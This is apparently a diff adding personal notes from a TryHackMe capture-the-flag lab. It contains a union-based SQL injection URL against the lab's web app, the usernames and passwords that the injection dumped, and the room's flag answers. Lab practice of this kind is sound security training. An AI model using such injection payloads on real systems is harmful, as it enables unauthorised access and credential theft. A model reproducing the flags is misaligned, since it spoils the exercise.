@@ -1,0 +1,20 @@
+
+http://10-10-226-135.p.thmlabs.com/webapp/elf.php?id=-1%20union%20all%20select%20null,null,username,password,null,null,null%20from%20users
+Latest Toys
+ 	Toy	Description
+	santa 	H0hohO2022
+	elf.mcskidy 	SkidyPass
+	elf.exploit 	Python22
+	elf.recon 	Oz1nt4L1f3
+	elf.pivot 	Jumping1234
+	elf.log 	ErR0r4O4
+	elf.forensic 	F0renzics
+	elf.admin 	123456
+
+Flag1: THM{McCode, Elf McCode}
+
+Flag2: THM{KodeNRoll}
+
+Flag3: THM{Are we secure yet?}
+
+Flag3: THM{SQLi_who???}
